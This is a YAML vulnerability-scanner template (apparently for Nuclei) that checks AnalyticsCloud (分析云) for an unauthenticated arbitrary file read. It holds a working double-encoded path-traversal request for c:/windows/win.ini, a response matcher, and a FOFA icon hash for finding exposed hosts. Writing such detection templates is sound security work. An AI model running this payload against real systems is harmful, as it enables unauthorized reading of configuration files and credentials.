http:
    - matchers:
        - part: body
          type: word
          words:
            - ; for 16-bit app support
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /.%252e/.%252e/c:/windows/win.ini HTTP/1.1
          Host: {{Hostname}}
id: AnalyticsCloud-fenxiyun-File-reading
info:
    author: Superhero
    description: |-
        fofa: icon_hash="888607769"
        AnalyticsCloud 分析云 存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
    name: AnalyticsCloud 分析云 任意文件读取漏洞
    reference:
        - https://blog.csdn.net/m0_60571842/article/details/140655179
    severity: high
    tags:
        - File reading
